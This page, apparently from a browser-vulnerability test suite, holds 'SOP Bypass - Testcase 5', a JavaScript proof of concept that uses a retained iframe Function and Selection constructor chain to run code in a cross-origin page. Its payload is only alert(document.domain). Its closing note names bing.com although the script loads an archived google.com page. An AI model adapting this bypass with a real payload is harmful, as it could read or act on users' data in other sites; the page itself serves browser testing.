---
layout: default
title: SOP Bypass - Testcase 5
permalink: /sop/new/5
---

<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="sop()">
<script>
function sop() {
    frame = document.body.appendChild(document.createElement("iframe"));
    wnd = frame.contentWindow;
    func = wnd.Function;
    wnd.location = "about:blank";
    frame.onload = function() {
        selection = func("return getSelection()")();
        wnd.location = "https://web.archive.org/web/20180831120251/http://google.com";
        frame.onload = function() {
            frame.onload = null;
            selection.baseNode.constructor.constructor.constructor("alert(document.domain)")()
        }
    }
}
</script>

**Note:**
If page displays an alert box displaying bing.com, your browser is vulnerable to SOP bypass.
